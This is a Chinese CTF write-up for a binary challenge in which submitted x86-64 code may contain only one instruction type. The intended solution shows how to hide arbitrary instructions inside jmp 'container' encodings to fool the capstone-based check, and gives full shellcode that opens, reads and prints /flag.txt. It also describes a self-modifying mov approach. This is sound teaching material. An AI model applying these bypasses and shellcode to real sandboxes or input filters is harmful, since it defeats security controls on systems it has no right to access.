# [Binary] 简单题

- 命题人：liangjs
- 题目分值：350 分

## 题目描述

<blockquote>
<p>题太难了？来看看简单题吧！</p>
<p>只有一种指令的机器，够简单吧！</p>
</blockquote>
<p>你可以提交一段 x86-64 机器码，题目会检查这段机器码<strong>只包含一种汇编指令</strong>，然后运行它。</p>
<p><strong>Flag 位于服务器磁盘中的 <code>/flag.txt</code> 文件。</strong></p>
<div class="well">
<p><strong>第二阶段提示：</strong></p>
<p>指令种类是在运行前检查的，运行时并非只能执行一种指令。</p>
</div>

**【终端交互：连接到题目】**

**[【附件：下载题目源码（prob10.zip）】](attachment/prob10.zip)**

## 预期解法

### 使用 jmp

用 `jmp` 指令可以跳到指令中间，让处理器从中间开始解码，从而绕过指令种类的限制。

`jmp` 指令的格式参考 https://www.felixcloutier.com/x86/jmp 

构造如下指令片段
```asm
EB 01            ; jmp $+3
E9 XX XX XX XX   ; container jmp <...> 
```

我们把 relative near jump (`E9 XX XX XX XX`) 用作其他指令的容器，其中 `XX` 填写为想要执行的任意指令的机器码。
容器本身的 `jmp` 并不会被执行到，因为我们在前面添加了一个 short jump (`EB 01`)，使控制流跳转到 `XX` 的位置。

题目使用 capstone 来检查指令种类，这个库只会按字节顺序解码指令，不考虑指令本身的语义，因此会把上述片段识别为两个 `jmp` 指令。

可以把多个这种片段拼在一起，就能执行任意指令了。

由于容器 `jmp` 最多能装4个字节，我们 shellcode 里的指令长度最大是4，写出这样的 shellcode 并不困难，把长的指令替换为等价的一系列短指令即可，下面是一个示例。另外，如果指令长度小于4，可以在它后面填充 `nop` 指令凑齐4字节。

```asm
.intel_syntax noprefix

; put "flag.txt" on stack
xor eax, eax
mov cl, 16
mov ax, 0x7478
shl rax, cl
mov ax, 0x742e
shl rax, cl
mov ax, 0x6761
shl rax, cl
mov ax, 0x6c66
push 0
push rax

; fd = open("flag.txt", O_RDONLY)
xor eax, eax
mov ax, 2
mov rdi, rsp
xor esi, esi
syscall

; size = read(fd, buf_rsp, 1<<7)
mov edi, eax
xor eax, eax
mov rsi, rsp
xor edx, edx
inc edx
shl edx, 7
syscall

; write(1, buf_rsp, size)
mov edx, eax
xor eax, eax
inc eax
mov edi, eax
syscall
```

### 使用 mov

选手上传的代码会被放入 mmap 开辟的一段内存中，权限为“可读可写可执行”，因此可以构造自修改的代码。

用 `mov` 指令和相对寻址，可以直接修改后续指令的内容，示例如下：
```asm
movq [rip+100], 0x11111111
movq [rip+200], 0x22222222
...
```

整个 payload 分为两段，前一段用一串 `mov` 把后一段修改掉，后一段一开始随便放些 `mov` 来占位，之后被修改为实际的 shellcode。

由于出题人太懒了，具体代码请参考选手 writeup。

除了 `mov`，还可以使用 `add`, `xor` 等算术指令来修改代码，做法是类似的。
